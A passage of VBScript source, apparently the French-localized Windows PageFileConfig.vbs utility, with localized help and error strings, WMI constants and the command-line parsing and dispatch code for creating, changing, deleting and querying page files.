CONST L_ShowUsageLine23_Text                 = "    PAGEFILECONFIG.vbs /Create /?"
CONST L_ShowUsageLine24_Text                 = "    PAGEFILECONFIG.vbs /Delete /?"
CONST L_ShowUsageLine25_Text                 = "    PAGEFILECONFIG.vbs /Query /?"

' constants for showing help for /Change option
CONST L_ShowChangeUsageLine02_Text           = "PageFileConfig.vbs -change [/S systme [-u utilisateur [-p mot_de_passe]]]"
CONST L_ShowChangeUsageLine03_Text           = "                   { [/I tailleinitiale] [/M taillemaximale] }"
CONST L_ShowChangeUsageLine04_Text           = "                   /VO volume1 [/VO volume2 [... [/VO volumeN]]]"
CONST L_ShowChangeUsageLine07_Text           = "    Modifie le fichier d'change existant des paramtres de mmoire virtuelle."
CONST L_ShowChangeUsageLine18_Text           = "    /I     Taille initiale     Spcifie la nouvelle taille initiale (en Mo)"
CONST L_ShowChangeUsageLine19_Text           = "                            utiliser pour le fichier d'change spcifi."
CONST L_ShowChangeUsageLine21_Text           = "    /M    Taille maximale  Spcifie la nouvelle taille maximale (en Mo)"
CONST L_ShowChangeUsageLine22_Text           = "                            utiliser pour le fichier d'change spcifi."
CONST L_ShowChangeUsageLine24_Text           = "    /VO   lettre_volume    Spcifie le lecteur local dont les paramtres"
CONST L_ShowChangeUsageLine25_Text           = "                           de fichier d'change doivent tre modifis. Entrez"
CONST L_ShowChangeUsageLine26_Text           = "                           '*' pour slectionner tous les lecteurs locaux."
CONST L_ShowChangeUsageLine27_Text           = "                           Exemple : ""C:"" ou ""*"""
CONST L_ShowChangeUsageLine30_Text           = "    PAGEFILECONFIG.vbs /Change /?"
CONST L_ShowChangeUsageLine31_Text           = "    PAGEFILECONFIG.vbs /Change /M 400 /VO c:"
CONST L_ShowChangeUsageLine32_Text           = "    PageFileConfig.vbs -change /S systme -u utilisateur -m 400 -vo c:"
CONST L_ShowChangeUsageLine33_Text           = "    PageFileConfig.vbs -change /S systme -u utilisateur -i 20 -vo *"
CONST L_ShowChangeUsageLine34_Text           = "    PageFileConfig.vbs -change /S systme -u utilisateur -p mot_de_passe -i 200"
CONST L_ShowChangeUsageLine35_Text           = "                       /M 500 /VO c: /VO d:"

' constants for showing help for /Create option
CONST L_ShowCreateUsageLine02_Text           = "PageFileConfig.vbs -create [/S systme [-u utilisateur [-p mot_de_passe]]]"
CONST L_ShowCreateUsageLine03_Text           = "                   /I tailleinitiale /M taillemaximale"
CONST L_ShowCreateUsageLine04_Text           = "                   /VO volume1 [/VO volume2 [... [/VO volumeN]]]"
CONST L_ShowCreateUsageLine07_Text           = "    Cre ou ajoute un ""fichier d'change"" supplmentaire sur le systme."
CONST L_ShowCreateUsageLine18_Text           = "    /I     Taille initiale     Spcifie la nouvelle taille initiale (en Mo)"
CONST L_ShowCreateUsageLine19_Text           = "                           pour le fichier d'change en cours de cration."
CONST L_ShowCreateUsageLine21_Text           = "    /M    Taille maximale  Spcifie la nouvelle taille maximale (en Mo)"
CONST L_ShowCreateUsageLine22_Text           = "                           pour le fichier d'change en cours de cration."
CONST L_ShowCreateUsageLine24_Text           = "    /VO    Lettre de lecteur      Spcifie le lecteur local sur lequel doit"
CONST L_ShowCreateUsageLine25_Text           = "                           tre cr le fichier d'change. Entrez '*'"
CONST L_ShowCreateUsageLine26_Text           = "                           pour slectionner tous les lecteurs locaux."
CONST L_ShowCreateUsageLine27_Text           = "                           Exemple : ""C:"" ou ""*"""
CONST L_ShowCreateUsageLine30_Text           = "    PAGEFILECONFIG.vbs /Create /?"
CONST L_ShowCreateUsageLine31_Text           = "    PAGEFILECONFIG.vbs /Create /I 140 /M 300 /VO d:"
CONST L_ShowCreateUsageLine32_Text           = "    PageFileConfig.vbs -create /S systme -u utilisateur -i 150 -m 300 -vo d:"
CONST L_ShowCreateUsageLine33_Text           = "    PageFileConfig.vbs -create /S systme -u utilisateur -i 50 -m 200 -vo *"
CONST L_ShowCreateUsageLine34_Text           = "    PageFileConfig.vbs -create /S systme -u utilisateur -p mot_de_passe -i 100"
CONST L_ShowCreateUsageLine35_Text           = "                       /M 600 /VO d: /VO e: /VO f:"

' constants for showing help for /Delete option
CONST L_ShowDeleteUsageLine02_Text           = "PageFileConfig.vbs -delete [/S systme [-u utilisateur [-p mot_de_passe]]]"
CONST L_ShowDeleteUsageLine03_Text           = "                   /VO volume1 [/VO volume2 [... [/VO volumeN]]]"
CONST L_ShowDeleteUsageLine06_Text           = "    Supprime les fichiers d'change du systme."
CONST L_ShowDeleteUsageLine17_Text           = "    /VO   lettre_volume    Spcifie la page 'who' du lecteur local"
CONST L_ShowDeleteUsageLine18_Text           = "                           le fichier doit tre supprim."
CONST L_ShowDeleteUsageLine19_Text           = "                           Exemple: ""C:"""
CONST L_ShowDeleteUsageLine22_Text           = "    PAGEFILECONFIG.vbs /Delete /?"
CONST L_ShowDeleteUsageLine23_Text           = "    PAGEFILECONFIG.vbs /Delete /VO d:"
CONST L_ShowDeleteUsageLine24_Text           = "    PageFileConfig.vbs -delete /S systme -u utilisateur -vo d: -vo e:"
CONST L_ShowDeleteUsageLine25_Text           = "    PageFileConfig.vbs -delete /S systme -u utilisateur -p mot_de_passe -vo d:"

' constants for showing help for /Query option
CONST L_ShowQueryUsageLine02_Text            = "PageFileConfig.vbs -query [/S systme [-u utilisateur [-p mot_de_passe]]]"
CONST L_ShowQueryUsageLine03_Text            = "                   [/FO format]"
CONST L_ShowQueryUsageLine06_Text            = "    Affiche les paramtres de mmoire virtuelle du fichier d'change d'un systme."
CONST L_ShowQueryUsageLine17_Text            = "    /FO        format              Spcifie le format dans lequel la sortie"
CONST L_ShowQueryUsageLine18_Text            = "                           doit tre affiche."
CONST L_ShowQueryUsageLine19_Text            = "                           Valeurs valides: ""TABLE"", ""LIST"", ""CSV""."
CONST L_ShowQueryUsageLine22_Text            = "    PAGEFILECONFIG.vbs"
CONST L_ShowQueryUsageLine23_Text            = "    PAGEFILECONFIG.vbs /Query"
CONST L_ShowQueryUsageLine24_Text            = "    PAGEFILECONFIG.vbs /Query /?"
CONST L_ShowQueryUsageLine25_Text            = "    PAGEFILECONFIG.vbs /Query /FO table"
CONST L_ShowQueryUsageLine26_Text            = "    PageFileConfig.vbs -query /S systme -u utilisateur"
CONST L_ShowQueryUsageLine27_Text            = "    PageFileConfig.vbs -query /S systme -u utilisateur -p mot_de_passe -fo LIST"

' constants for error messages
CONST L_UnableToInclude_ErrorMessage         = "ERREUR : impossible d'inclure le module commun ""CmdLib.Wsc""."
CONST L_InvalidHelpUsage_ErrorMessage        = "ERREUR : utilisation incorrecte de l'Aide. Entrez /? pour afficher l'aide."
CONST L_InvalidParameter_ErrorMessage        = "ERREUR : argument non valide/Option - '%1'."
CONST L_InvalidInput_ErrorMessage            = "ERREUR : entre non valide. Vrifiez les valeurs entres."
CONST L_InvalidCredentials_ErrorMessage      = "ERREUR : informations d'identification non valides. Vrifiez l'ordinateur, l'utilisateur et le mot de passe qui ont t communiqus."
CONST L_InvalidVolumeName_ErrorMessage       = "ERREUR : volume non valide '%1' spcifi."
CONST L_InvalidUserReply_ErrorMessage        = "ERREUR : choix non valide. Entrez un choix valide."
CONST L_FailCreateObject_ErrorMessage        = "ERREUR : impossible de crer un objet."
CONST L_UnableToRetrieveInfo_ErrorMessage    = "ERREUR : impossible d'accder aux informations."
CONST L_CannotCreate_ErrorMessage            = "ERREUR : le fichier d'change du volume spcifi ne peut pas tre cr."
CONST L_InvalidPhysicalDrive_ErrorMessage    = "ERREUR : le volume '%1' n'est pas un lecteur physique valide."
CONST L_UpdateFailed_ErrorMessage            = "ERREUR : la mise  jour du fichier d'change a chou."
CONST L_InvalidInitSizeValue_ErrorMessage    = "ERREUR: entrez une valeur numrique pour la taille initiale du fichier d'change."
CONST L_InvalidMaxSizeValue_ErrorMessage     = "ERREUR: entrez une valeur numrique pour la taille maximale du fichier d'change."

' constant for hint message to show remote connectivity failure
CONST L_HintCheckConnection_Message          = "ERREUR : vrifiez le nom du systme, les informations d'identification et le noyau WBEM."

' constants for info. messages
CONST L_PageFileDoesNotExist_ErrorMessage    = "INFO : aucun fichier d'change n'existe sur ce volume : '%1'"
CONST L_NoPageFiles_Message                  = "Informations : aucun fichier d'change n'est disponible."

' constants for Syntax Error Messages
CONST L_InvalidSyntax_ErrorMessage           = "ERREUR : syntaxe incorrecte."
CONST L_InvalidServerName_ErrorMessage       = "ERREUR : syntaxe incorrecte. Le nom du systme ne peut pas tre laiss vide."
CONST L_InvalidUserName_ErrorMessage         = "ERREUR : Syntaxe incorrecte. Le nom d'utilisateur ne peut pas tre vide."
CONST L_TypeUsage_Message                    = "Entrez ""%1 /?"" pour afficher la syntaxe."
CONST L_TypeCreateUsage_Message              = "Entrez ""%1 /Create /?"" pour afficher la syntaxe."
CONST L_TypeChangeUsage_Message              = "Entrez ""%1 /Change /?"" pour afficher la syntaxe."
CONST L_TypeDeleteUsage_Message              = "Entrez ""%1 /Delete /?"" pour afficher la syntaxe."
CONST L_TypeQueryUsage_Message               = "Entrez ""%1 /Query /?"" pour afficher la syntaxe."

' constants for missing mandatory option messages
CONST L_VolumeNameNotSpecified_ErrorMessage  = "L'option obligatoire '/VO' est absente."
CONST L_InitialSizeNotSpecified_ErrorMessage = "L'option obligatoire '/I' est manquante."
CONST L_MaximumSizeNotSpecified_ErrorMessage = "L'option obligatoire '/M' est manquante."
CONST L_NoneoftheSizeSpecified_ErrorMessage  = "Les options obligatoires '/I' et '/M' sont manquantes."
CONST L_FormatNotSpecified_ErrorMessage      = "L'option obligatoire '/FO' est absente."

' error messages for invalid usage of s,u,p switches
CONST L_InvalidServerCredentials_ErrorMessage = "Erreur : syntaxe non valide. L'option /U ne peut pas tre spcifie sans l'option /S."
CONST L_InvalidUserCredentials_ErrorMessage   = "Erreur : syntaxe non valide. L'option /P ne peut pas tre spcifie sans l'option /U."

' constants for Mutliple line Error Messages
CONST L_InsufficientMaxSize1_ErrorMessage    = "ERREUR : la taille maximale du fichier d'change sur le volume '%1' devrait tre suprieure ou "
CONST L_InsufficientMaxSize2_ErrorMessage    = "       gale  la taille du fichier d'change initial et infrieure  %2 Mo ou infrieure "
CONST L_InsufficientMaxSize3_ErrorMessage    = "        la taille du disque."
CONST L_InitialSizeRange1_ErrorMessage       = "ERREUR : la taille de fichier d'change initiale doit tre comprise entre 2 Mo et %1 Mo, et "
CONST L_InitialSizeRange2_ErrorMessage       = "       ne peut pas dpasser le montant d'espace libre sur le lecteur que vous avez slectionn. "
CONST L_NotEnoughSpace1_ErrorMessage         = "ERREUR : il n'y a pas assez d'espace sur ce lecteur pour le fichier d'change spcifi."
CONST L_NotEnoughSpace2_ErrorMessage         = "       Entrez un nombre plus petit ou librer de l'espace disque."
CONST L_AtLeastFiveMB1_ErrorMessage          = "ERREUR : il n'y a pas assez d'espace sur ce lecteur pour crer le fichier d'change "
CONST L_AtLeastFiveMB2_ErrorMessage          = "       spcifi. Au moins 5 Mo d'espace disque doivent tre disponibles aprs"
CONST L_AtLeastFiveMB3_ErrorMessage          = "       la cration du fichier d'change. Spcifiez une taille de fichier d'change plus petite ou librez "
CONST L_AtLeastFiveMB4_ErrorMessage          = "       de l'espace sur le disque."
CONST L_DiskTooSmall1_ErrorMessage           = "ERREUR : le lecteur '%1' est trop petit pour la taille du fichier d'change maximale spcifie."
CONST L_DiskTooSmall2_ErrorMessage           = "       Entrez un nombre plus petit."

' constants for Mutliple line Warning Messages
CONST L_GrowsToFreeSpaceWarning1_Message     = "AVERTISSEMENT : le lecteur '%1' n'a pas assez d'espace libre pour la taille "
CONST L_GrowsToFreeSpaceWarning2_Message     = "         du fichier d'change maximale spcifie. Si vous continuez avec ce paramtre, le fichier d'change "
CONST L_GrowsToFreeSpaceWarning3_Message     = "         va grandir  la taille de l'espace disque disponible (%2 Mo)."
CONST L_CrashDumpSettingWarning1_Message     = "AVERTISSEMENT : si le fichier d'change sur le volume '%1' a une taille initiale infrieure "
CONST L_CrashDumpSettingWarning2_Message     = "         %2, le systme ne pourra pas crer de fichier"
CONST L_CrashDumpSettingWarning3_Message     = "         d'informations de dbogage si une erreur STOP se produit."

' constants for Multiple line SUCCESS / SKIPPING messages
CONST L_ChangeIntSuccess1_Message            = "OPRATION RUSSIE : la taille initiale du fichier d'change sur '%1' a t modifie de "
CONST L_ChangeIntSuccess2_Message            = "         %2 Mo  %3 Mo."
CONST L_ChangeMaxSuccess1_Message            = "OPRATION RUSSIE : la taille maximale pour le fichier d'change sur '%1' a t modifie de "
CONST L_ChangeMaxSuccess2_Message            = "         %2 Mo  %3 Mo."
CONST L_ChangeIntSkipping1_Message           = "IGNORER : la taille initiale spcifie pour le fichier d'change sur '%1' est la mme que "
CONST L_ChangeIntSkipping2_Message           = "          la valeur actuelle."
CONST L_ChangeMaxSkipping1_Message           = "IGNORER : la taille maximale spcifie pour le fichier d'change sur '%1' est la mme que "
CONST L_ChangeMaxSkipping2_Message           = "          la valeur actuelle."
CONST L_CreateSuccess1_Message               = "OPRATION RUSSIE : un fichier d'change d'une taille initiale de %1 Mo et d'une taille maximale "
CONST L_CreateSuccess2_Message               = "         de %2 Mo a t cr sur le volume : '%3'"
CONST L_CreateSkipping_Message               = "IGNORɠ: un fichier d'change existe dj dans le volume: '%1'"
CONST L_DeleteSuccess_Message                = "SUCCS: le fichier d'change dans le volume '%1' a t correctement supprim."

' constant for other error messages
CONST L_InvalidFormat_ErrorMessage           = "Format non valide '%1' spcifi."
CONST L_SystemManagedSize_ErrorMessage       = "Accs refus : taille gre par le systme sur le volume '%1'"
CONST L_PromptForContinueAnyWay_Message      = "Voulez-vous quand mme continuer? [o/n]?"
CONST L_NotAllowedMoreThanOnce_ErrorMessage  = "L'option '%1' n'est pas autorise plus de '1' fois."
CONST L_RestartComputer_Message              = "Redmarrez l'ordinateur pour que ces changements prennent effet."

'******************************************************************************
' END of Localization Content
'******************************************************************************

' the main options
CONST OPTION_HELP                       = "?"
CONST OPTION_CHANGE                     = "change"
CONST OPTION_CREATE                     = "create"
CONST OPTION_DELETE                     = "delete"
CONST OPTION_QUERY                      = "query"

' the suboptions
CONST SUB_OPTION_SERVER                 = "s"
CONST SUB_OPTION_USER                   = "u"
CONST SUB_OPTION_PASSWORD               = "p"
CONST SUB_OPTION_INTSIZE                = "i"
CONST SUB_OPTION_MAXSIZE                = "m"
CONST SUB_OPTION_VOLUME                 = "vo"
CONST SUB_OPTION_FORMAT                 = "fo"

' constant for CScript
CONST CONST_CSCRIPT                     = 2

' constants for error codes
CONST CONST_ERROR                       = 0

' constants for options
CONST CONST_SHOW_USAGE                  = 3
CONST CONST_CHANGE_OPTION               = 11
CONST CONST_CREATE_OPTION               = 21
CONST CONST_DELETE_OPTION               = 31
CONST CONST_QUERY_OPTION                = 41

' constant for matched pattern
CONST CONST_NO_MATCHES_FOUND            = 0

' utility specific constants
CONST INITIAL_SIZE_LB                   = 2
CONST DRIVE_TYPE                        = 3
CONST MEGA_BYTES                        = " MB"
CONST SIZE_FACTOR                       = 1.5
CONST CONVERSION_FACTOR                 = 1048576
CONST PAGEFILE_DOT_SYS                  = "\pagefile.sys"

' constant for the UNC format server name
CONST UNC_FORMAT_SERVERNAME_PREFIX      = "\\"

' constants for exit values
CONST EXIT_SUCCESS                      = 0
CONST EXIT_UNEXPECTED                   = 255
CONST EXIT_INVALID_INPUT                = 254
CONST EXIT_METHOD_FAIL                  = 250
CONST EXIT_QUERY_FAIL                   = 253
CONST EXIT_INVALID_PARAM                = 999

' Define namespace and class names of wmi
CONST CONST_WBEM_FLAG                   = 131072
CONST CONST_NAMESPACE_CIMV2             = "root\cimv2"
CONST CLASS_PAGE_FILE_SETTING           = "Win32_PageFileSetting"
CONST CLASS_LOGICAL_DISK                = "Win32_LogicalDisk"
CONST CLASS_COMPUTER_SYSTEM             = "Win32_ComputerSystem"
CONST CLASS_PAGE_FILE_USAGE             = "Win32_PageFileUsage"
CONST CLASS_OPERATING_SYSTEM            = "Win32_OperatingSystem"
CONST CLASS_PERFDISK_PHYSICAL_DISK      = "Win32_PerfRawData_PerfDisk_PhysicalDisk"

' constants for data lengths for ShowResults (15,13,13,19,20,20,20,22)
CONST CONST_HOSTNAME_LENGTH             = 15
CONST CONST_DRIVENAME_LENGTH            = 13
CONST CONST_VOLLABEL_LENGTH             = 13
CONST CONST_PAGEFILENAME_LENGTH         = 19
CONST CONST_INTSIZE_LENGTH              = 20
CONST CONST_MAXSIZE_LENGTH              = 20
CONST CONST_CURRENTSIZE_LENGTH          = 20
CONST CONST_FREESPACE_LENGTH            = 22

' constants for data lengths for ShowResults (15,33,37,40)
CONST CONST_TOTALMINSIZE_LENGTH         = 33
CONST CONST_TOTALRECSIZE_LENGTH         = 37
CONST CONST_TOTALSIZE_LENGTH            = 40

Dim UseCscriptErrorMessage  ' string to store the CScript usage
Dim blnLocalConnection      ' flag for local connection
Dim component               ' object for the common module

' Error Messages
Dim InsufficientMaxSizeErrorMessage
Dim InitialSizeRangeErrorMessage
Dim NotEnoughSpaceErrorMessage
Dim AtLeastFiveMBErrorMessage
Dim DiskTooSmallErrorMessage

' Warning Messages
Dim GrowsToFreeSpaceWarningMessage
Dim CrashDumpSettingWarningMessage

' Success / Skipping messages
Dim ChangeIntSuccessMessage
Dim ChangeMaxSuccessMessage
Dim ChangeIntSkippingMessage
Dim ChangeMaxSkippingMessage
Dim CreateSuccessMessage

UseCscriptErrorMessage                  = L_UseCscript1_ErrorMessage & vbCRLF & _
                                          L_UseCscript2_ErrorMessage & vbCRLF & vbCRLF & _
                                          L_UseCscript3_ErrorMessage & vbCRLF & _
                                          L_UseCscript4_ErrorMessage & vbCRLF & vbCRLF & _
                                          L_UseCscript5_ErrorMessage

InsufficientMaxSizeErrorMessage         = L_InsufficientMaxSize1_ErrorMessage & vbCRLF & _
                                          L_InsufficientMaxSize2_ErrorMessage & vbCRLF & _
                                          L_InsufficientMaxSize3_ErrorMessage
InitialSizeRangeErrorMessage            = L_InitialSizeRange1_ErrorMessage & vbCRLF & _
                                          L_InitialSizeRange2_ErrorMessage
NotEnoughSpaceErrorMessage              = L_NotEnoughSpace1_ErrorMessage & vbCRLF & _
                                          L_NotEnoughSpace2_ErrorMessage
AtLeastFiveMBErrorMessage               = L_AtLeastFiveMB1_ErrorMessage & vbCRLF & _
                                          L_AtLeastFiveMB2_ErrorMessage & vbCRLF & _
                                          L_AtLeastFiveMB3_ErrorMessage & vbCRLF & _
                                          L_AtLeastFiveMB4_ErrorMessage
DiskTooSmallErrorMessage                = L_DiskTooSmall1_ErrorMessage & vbCRLF & _
                                          L_DiskTooSmall2_ErrorMessage

GrowsToFreeSpaceWarningMessage          = L_GrowsToFreeSpaceWarning1_Message & vbCRLF & _
                                          L_GrowsToFreeSpaceWarning2_Message & vbCRLF & _
                                          L_GrowsToFreeSpaceWarning3_Message
CrashDumpSettingWarningMessage          = L_CrashDumpSettingWarning1_Message & vbCRLF & _
                                          L_CrashDumpSettingWarning2_Message & vbCRLF & _
                                          L_CrashDumpSettingWarning3_Message

ChangeIntSuccessMessage                 = L_ChangeIntSuccess1_Message & vbCRLF & _
                                          L_ChangeIntSuccess2_Message
ChangeMaxSuccessMessage                 = L_ChangeMaxSuccess1_Message & vbCRLF & _
                                          L_ChangeMaxSuccess2_Message
ChangeIntSkippingMessage                = L_ChangeIntSkipping1_Message & vbCRLF & _
                                          L_ChangeIntSkipping2_Message
ChangeMaxSkippingMessage                = L_ChangeMaxSkipping1_Message & vbCRLF & _
                                          L_ChangeMaxSkipping2_Message
CreateSuccessMessage                    = L_CreateSuccess1_Message & vbCRLF & _
                                          L_CreateSuccess2_Message

blnLocalConnection = FALSE

' create the object for commom module
Set component = CreateObject( "Microsoft.CmdLib" )

' check if the commom module(CmdLib.wsc) is not registered
If Err.Number Then
    Err.Clear
    WScript.Echo(L_UnableToInclude_ErrorMessage)
    WScript.Quit(EXIT_METHOD_FAIL)
End If

' set the scripting host to WScript
Set component.ScriptingHost = WScript.Application

' Check whether the script is run using CScript
If CInt(component.checkScript) <> CONST_CSCRIPT Then
    WScript.Echo (UseCscriptErrorMessage)
    WScript.Quit(EXIT_UNEXPECTED)
End If

' call the main function
Call VBMain()

' quit with exit value = 0
WScript.Quit(EXIT_SUCCESS)


'******************************************************************************
'* Sub:     VBMain
'*
'* Purpose: This is main function to starts execution 
'*
'* Input:   None
'*
'* Output:  None
'*
'******************************************************************************

Sub VBMain()

    ON ERROR RESUME NEXT
    Err.Clear

    ' Declaring main variables
    Dim strMachine             ' machine to configure page files on
    Dim strUserName            ' user name to connect to the machine
    Dim strPassword            ' password for the user
    Dim intIntSize             ' initial size for the page file
    Dim intMaxSize             ' maximum size for the page file
    Dim strVolName             ' volume name
    Dim objVols                ' object containing volume names
    Dim strFormat              ' query display format
    Dim intMainOption          ' main option specified
    Dim intTempResult          ' temporary variable to hold the return value
    Dim blnValidArguments      ' stores the return value of ValidateArguments

    ' Initializing Variables
    intTempResult = CONST_ERROR           ' default is CONST_ERROR (=0)
    strFormat     = L_DefaultFormat_Text  ' default format is LIST

    Set objVols = CreateObject("Scripting.Dictionary")
    objVols.CompareMode = VBBinaryCompare

    If Err.Number Then
        ' Unable to create the dictionary object.
        Err.Clear
        WScript.Echo(L_FailCreateObject_ErrorMessage)
        WScript.Quit(EXIT_METHOD_FAIL)
    End If

    intTempResult  = intParseCmdLine( strMachine,   _
                                      strUserName,  _
                                      strPassword,  _
                                      intIntSize,   _
                                      intMaxSize,   _
                                      strVolName,   _
                                      objVols,      _
                                      strFormat,    _
                                      intMainOption )

    ' Select the operation specified by the user
    Select Case intTempResult
        Case CONST_SHOW_USAGE
            Select Case intMainOption
                Case CONST_CHANGE_OPTION
                    Call ShowChangeUsage()
                Case CONST_CREATE_OPTION
                    Call ShowCreateUsage()
                Case CONST_DELETE_OPTION
                    Call ShowDeleteUsage()
                Case CONST_QUERY_OPTION
                    Call ShowQueryUsage()
                Case Else
                    Call ShowUsage()
            End Select

        Case CONST_CHANGE_OPTION
            blnValidArguments = ValidateArguments (strMachine, strUserName, strPassword, _
                                                   intIntSize, intMaxSize, objVols, strFormat, _
                                                   intMainOption)
            ' If all arguments valid, proceed
            If blnValidArguments Then
                Call ProcessChange(strMachine, strUserName, strPassword, _
                                   intIntSize, intMaxSize, objVols)
            End If

        Case CONST_CREATE_OPTION
            blnValidArguments = ValidateArguments (strMachine, strUserName, strPassword, _
                                                   intIntSize, intMaxSize, objVols, strFormat, _
                                                   intMainOption)
            ' If all arguments valid, proceed
            If blnValidArguments Then
                Call ProcessCreate(strMachine, strUserName, strPassword, _
                                   intIntSize, intMaxSize, objVols)
            End If

        Case CONST_DELETE_OPTION
            blnValidArguments = ValidateArguments (strMachine, strUserName, strPassword, _
                                                   intIntSize, intMaxSize, objVols, strFormat, _
                                                   intMainOption)
            ' If all arguments valid, proceed
            If blnValidArguments Then
                Call ProcessDelete(strMachine, strUserName, strPassword, objVols)
                ' Here wild cards cannot be specified
            End If

        Case CONST_QUERY_OPTION
            blnValidArguments = ValidateArguments (strMachine, strUserName, strPassword, _
                                                   intIntSize, intMaxSize, objVols, strFormat, _
                                                   intMainOption)
            ' If all arguments valid, proceed
            If blnValidArguments Then
                Call ProcessQuery(strMachine, strUserName, strPassword, strFormat)
            End If

        Case CONST_ERROR
            WSCript.Quit(EXIT_INVALID_INPUT)
        End Select

End Sub


'******************************************************************************
'* Function: intParseCmdLine
'*
'* Purpose:  Parses the command line arguments to the variables
'*
'* Input:
'*  [out]    strMachine         machine to configure page files on
'*  [out]    strUserName        user name to connect to the machine
'*  [out]    strPassword        password for the user
'*  [out]    intIntSize         initial size for the page file
'*  [out]    intMaxSize         maximum size for the page file
'*  [in]     strVolName         individual volume name(s)
'*  [out]    objVols            object containing volume names
'*  [out]    strFormat          query display format
'*  [out]    intMainOption      main option specified
'*
'* Output:   Returns CONST_SHOW_USAGE, CONST_CHANGE_OPTION ,
'*                   CONST_CREATE_OPTION, CONST_DELETE_OPTION ,
'*                   CONST_QUERY_OPTION or CONST_ERROR.
'*           Displays error message and quits if invalid option is asked
'*
'******************************************************************************
Private Function intParseCmdLine(   ByRef strMachine,   _
                                    ByRef strUserName,  _
                                    ByRef strPassword,  _
                                    ByRef intIntSize,   _
                                    ByRef intMaxSize,   _
                                    ByVal strVolName,   _
                                    ByRef objVols,      _
                                    ByRef strFormat,    _
                                    ByRef intMainOption )

    ON ERROR RESUME NEXT
    Err.Clear

    Dim strUserGivenArg      ' to temporarily store the user given arguments
    Dim intArgIter           ' to count the number of arguments given
    Dim intQCount            ' to count the number of help options given
    Dim intMainOptionNumber  ' to count the number of main operations selected (Max allowed = 1)
    Dim intVolumes           ' to store the number of volumes specified
    ' Following variables are used to check if a switch if given more than once
    Dim blnIntSizeSpecified
    Dim blnMaxSizeSpecified
    Dim blnFormatSpecified
    Dim blnMachineSpecified
    Dim blnUserSpecified
    Dim blnPasswordSpecified

    ' Initialization
    strUserGivenArg      = ""
    intMainOptionNumber  = 0
    intQCount            = 0
    intArgIter           = 0
    intParseCmdLine      = 0

    ' initially none of the parameters are specified, so set all flags to FALSE
    blnIntSizeSpecified  = FALSE
    blnMaxSizeSpecified  = FALSE
    blnFormatSpecified   = FALSE
    blnMachineSpecified  = FALSE
    blnUserSpecified     = FALSE
    blnPasswordSpecified = FALSE

    ' if no arguments are specified, default option is query
    If WScript.Arguments.Count = 0 Then
        intParseCmdLine  = CONST_QUERY_OPTION
        intMainOption    = CONST_QUERY_OPTION
    End If

    ' Retrieve the command line parameters and their values
    Do While intArgIter <= WScript.Arguments.Count - 1
        strUserGivenArg = WScript.Arguments.Item(intArgIter)
        ' check if the first character is a '-' OR '/' symbol
        If Left(strUserGivenArg,1) = "/"  OR Left(strUserGivenArg,1) = "-" Then
            ' ignore the symbol and take the rest as the switch specified
            strUserGivenArg = Right(strUserGivenArg,Len(strUserGivenArg) - 1)
            Select Case LCase(strUserGivenArg)

                Case LCase(OPTION_HELP)
                    intQCount = intQCount + 1
                    If (CInt(intQCount) >= 2 OR CInt(WScript.Arguments.Count) > 2) Then
                        intParseCmdLine = CONST_ERROR
                        WScript.Echo(L_InvalidHelpUsage_ErrorMessage)
                        Exit Function
                    Else
                        intParseCmdLine = CONST_SHOW_USAGE
                        intArgIter = intArgIter + 1
                    End If

                Case LCase(OPTION_CHANGE)
                    If intQCount = 1 Then ' intQCount = 1 means help specified
                        intParseCmdLine = CONST_SHOW_USAGE
                    Else
                        intParseCmdLine = CONST_CHANGE_OPTION
                    End If
                    intMainOption = CONST_CHANGE_OPTION
                    intMainOptionNumber = intMainOptionNumber + 1
                    intArgIter = intArgIter + 1

                Case LCase(OPTION_CREATE)
                    If intQCount = 1 Then ' intQCount = 1 means help specified
                        intParseCmdLine = CONST_SHOW_USAGE
                    Else
                        intParseCmdLine = CONST_CREATE_OPTION
                    End If
                    intMainOption = CONST_CREATE_OPTION
                    intMainOptionNumber = intMainOptionNumber + 1
                    intArgIter = intArgIter + 1

                Case LCase(OPTION_DELETE)
                    If intQCount = 1 Then ' intQCount = 1 means help specified
                        intParseCmdLine = CONST_SHOW_USAGE
                    Else
                        intParseCmdLine = CONST_DELETE_OPTION
                    End If
                    intMainOption = CONST_DELETE_OPTION
                    intMainOptionNumber = intMainOptionNumber + 1
                    intArgIter = intArgIter + 1

                Case LCase(OPTION_QUERY)
                    If intQCount = 1 Then ' intQCount = 1 means help specified
                        intParseCmdLine = CONST_SHOW_USAGE
                    Else
                        intParseCmdLine = CONST_QUERY_OPTION
                    End If
                    intMainOption = CONST_QUERY_OPTION
                    intMainOptionNumber = intMainOptionNumber + 1
                    intArgIter = intArgIter + 1

                Case LCase(SUB_OPTION_SERVER)
                    ' Check if server name is given with help usage
                    If intParseCmdLine = CONST_SHOW_USAGE Then
                        WScript.Echo(L_InvalidHelpUsage_ErrorMessage)
                        WScript.Quit(EXIT_INVALID_INPUT)
                    End If
                    ' Check if Machine Name is already specified
                    If NOT blnMachineSpecified Then
                        blnMachineSpecified = TRUE ' Set Specified Flag to TRUE
                        If NOT component.getArguments(L_MachineName_Text,strMachine,intArgIter,FALSE) Then
                            component.VBPrintf L_InvalidSyntax_ErrorMessage
                            Call typeMessage(intMainOption)
                            intParseCmdLine = CONST_ERROR
                            Exit Function
                        End If
                        intArgIter = intArgIter + 1
                    Else
                        component.VBPrintf L_InvalidSyntax_ErrorMessage & " " & _
                        L_NotAllowedMoreThanOnce_ErrorMessage , _
                        Array(WScript.Arguments.Item(intArgIter))
                        ' print the appropriate help usage message
                        Call typeMessage(intMainOption)
                        WScript.Quit(EXIT_INVALID_INPUT)
                    End If

                Case LCase(SUB_OPTION_USER)
                    ' Check if user name is given with help usage
                    If intParseCmdLine = CONST_SHOW_USAGE Then
                        WScript.Echo(L_InvalidHelpUsage_ErrorMessage)
                        WScript.Quit(EXIT_INVALID_INPUT)
                    End If
                    ' Check if User Name is already specified
                    If NOT blnUserSpecified Then
                        blnUserSpecified = TRUE ' Set Specified Flag to TRUE
                        If NOT component.getArguments(L_User_Text,strUserName,intArgIter,FALSE) Then
                            component.VBPrintf L_InvalidSyntax_ErrorMessage
                            Call typeMessage(intMainOption)
                            intParseCmdLine = CONST_ERROR
                            Exit Function
                        End If
                        intArgIter = intArgIter + 1
                    Else
                        component.VBPrintf L_InvalidSyntax_ErrorMessage & " " & _
                        L_NotAllowedMoreThanOnce_ErrorMessage , _
                        Array(WScript.Arguments.Item(intArgIter))
                        ' print the appropriate help usage message
                        Call typeMessage(intMainOption)
                        WScript.Quit(EXIT_INVALID_INPUT)
                    End If

                Case LCase(SUB_OPTION_PASSWORD)
                    ' Check if password is given with help usage
                    If intParseCmdLine = CONST_SHOW_USAGE Then
